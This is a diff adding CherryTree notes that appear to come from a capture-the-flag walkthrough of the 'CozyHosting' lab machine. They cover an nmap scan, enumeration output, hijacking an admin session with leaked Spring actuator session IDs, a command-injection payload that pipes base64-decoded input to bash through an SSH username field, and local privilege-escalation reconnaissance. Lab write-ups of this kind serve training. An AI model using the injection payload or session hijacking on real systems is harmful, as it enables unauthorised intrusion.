@@ -1,0 +1,197 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="CozyHosting" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167277" ts_lastsave="1694171410">
+    <rich_text>Nmap scan report for 10.129.105.42
+Host is up, received user-set (0.060s latency).
+Scanned at 2023-09-08 06:56:19 EDT for 87s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
+|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to </rich_text>
+    <rich_text link="webs http://cozyhosting.htb">http://cozyhosting.htb</rich_text>
+    <rich_text>
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Aggressive OS guesses: Linux 5.0 (99%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 - 3.13 (92%)
+No exact OS matches for host (If you know what OS is running on it, see </rich_text>
+    <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+    <rich_text> ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=9/8%OT=22%CT=1%CU=39566%PV=Y%DS=2%DC=T%G=Y%TM=64FAFE2A
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
+OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
+OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+</rich_text>
+    <node name="Enumeration" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167283" ts_lastsave="1694173639">
+      <rich_text>Port 80 will redirect to </rich_text>
+      <rich_text weight="heavy">cozyhosting.htb</rich_text>
+      <rich_text>. We will add it to </rich_text>
+      <rich_text weight="heavy">/etc/hosts</rich_text>
+      <rich_text>.
+Seems like it uses </rich_text>
+      <rich_text weight="heavy">Spring Framework</rich_text>
+      <rich_text> for the website.
+
+Ferox root:
+
+
+Dirsearch:
+
+
+On </rich_text>
+      <rich_text link="webs http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</rich_text>
+      <rich_text>, we find:
+
+
+We also find: </rich_text>
+      <rich_text weight="heavy">POST /executessh</rich_text>
+      <rich_text> whichwill try to execute a SSH.</rich_text>
+      <codebox char_offset="138" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">200      GET      285l      745w    12706c http://cozyhosting.htb/index
+200      GET       97l      196w     4431c http://cozyhosting.htb/login
+200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
+200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
+200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
+200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
+200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
+200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
+200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
+200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
+200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
+200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
+200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
+200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
+200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
+200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
+200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
+200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
+200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
+200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
+200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
+200      GET      285l      745w    12706c http://cozyhosting.htb/
+401      GET        1l        1w       97c http://cozyhosting.htb/admin
+204      GET        0l        0w        0c http://cozyhosting.htb/logout</codebox>
+      <codebox char_offset="152" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">[07:22:05] 200 -  634B  - /actuator
+[07:22:05] 200 -    5KB - /actuator/env
+[07:22:05] 200 -   15B  - /actuator/health
+[07:22:05] 200 -   10KB - /actuator/mappings
+[07:22:05] 200 -  198B  - /actuator/sessions
+[07:22:05] 200 -  124KB - /actuator/beans
+[07:22:06] 401 -   97B  - /admin
+[07:22:35] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
+[07:22:35] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
+[07:22:35] 500 -   73B  - /error
+[07:22:36] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
+[07:22:36] 200 -    0B  - /extjs/resources//charts.swf
+[07:22:41] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
+[07:22:43] 200 -   12KB - /index
+[07:22:48] 200 -    4KB - /login
+[07:22:48] 200 -    0B  - /login.wdm%2e</codebox>
+      <codebox char_offset="209" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;
+{"B2E7D7C97B0681D362D4B4E1A2731970":"kanderson","265CCDC8B0BCC6235261261DDB3F63DC":"kanderson","7E5BF2FAD9E200CB7046A8EC981AF523":"UNAUTHORIZED"}
+# which are just JSESSIONID. we can change ours with kanderson's to attempt to get an admin session</codebox>
+    </node>
+    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167289" ts_lastsave="1694175266">
+      <rich_text>We may try to get code execution using the </rich_text>
+      <rich_text weight="heavy">username</rich_text>
+      <rich_text> parameter in </rich_text>
+      <rich_text weight="heavy">executessh</rich_text>
+      <rich_text> command.
+We can get a shell by using (URL encoded):
+</rich_text>
+      <codebox char_offset="128" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">;echo${IFS}""|base64${IFS}-d|bash;#</codebox>
+    </node>
+    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167307" ts_lastsave="1694178107">
+      <rich_text>Initially, we are </rich_text>
+      <rich_text weight="heavy">app</rich_text>
+      <rich_text>.
+No SUDO capabilities.
+
+SUID
+
+
+/etc/passwd:
+
+
+netstat -tulpn
+
+
+We transfer </rich_text>
+      <rich_text link="file Y2xvdWRob3N0aW5nLTAuMC4xLmphcg==">cloudhosting-0.0.1.jar</rich_text>
+      <rich_text> on localhost, unarchive the jar, then we can find postgresql user and password:
+</rich_text>
+      <codebox char_offset="51" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/fusermount3
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/mount</codebox>
+      <codebox char_offset="67" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+app:x:1001:1001::/home/app:/bin/sh
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+josh:x:1003:1003::/home/josh:/usr/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false</codebox>
+      <codebox char_offset="85" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1014/java           
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   </codebox>
+      <codebox char_offset="203" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+    </node>
+  </node>
+</cherrytree>
